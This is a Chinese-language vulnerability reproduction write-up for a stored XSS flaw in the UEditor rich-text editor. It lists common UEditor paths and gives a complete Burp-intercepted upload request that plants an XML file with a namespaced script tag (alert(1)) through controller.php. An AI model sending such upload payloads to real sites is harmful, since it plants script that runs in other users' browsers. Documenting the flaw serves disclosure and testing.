# ueditor存在XSS漏洞

### 一、漏洞描述
ueditor存在XSS漏洞

### 二、影响版本
![1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22.png](./img/35L9MfrjXp4PhD_k/1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22-134145.png)

### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

查看版本：

```plain
/ueditor/ueditor.all.js
```

首先点击上传附件，通过burp拦截，修改上传内容

![1724048797908-50f299b7-99a0-4cab-8ede-ea98be75892d.png](./img/35L9MfrjXp4PhD_k/1724048797908-50f299b7-99a0-4cab-8ede-ea98be75892d-144688.png)

```plain
POST /ueditor/php/controller.php?action=uploadfile&encode=utf-8 HTTP/1.1
Host: 
Content-Length: 886
X_Requested_With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHZorABX70DBbzax
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="id"

WU_FILE_0
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="name"

phphello.jpg
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="type"

image/jpeg
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="lastModifiedDate"

Tue May 28 2024 11:33:15 GMT+0800 (香港标准时间)
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="size"

34
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="upfile"; filename="phphello.xml"
Content-Type: image/jpeg

<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
------WebKitFormBoundaryNHZorABX70DBbzax--
```

![1724076778474-6a6797d2-45dc-4bc3-897f-c16c48fc61e6.png](./img/35L9MfrjXp4PhD_k/1724076778474-6a6797d2-45dc-4bc3-897f-c16c48fc61e6-816298.png)

![1724055830613-310f0ec5-83c7-490b-ac93-5b1cd5c9a244.png](./img/35L9MfrjXp4PhD_k/1724055830613-310f0ec5-83c7-490b-ac93-5b1cd5c9a244-554733.png)



> 更新: 2024-09-05 23:24:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fn98g15xv4wqohvy>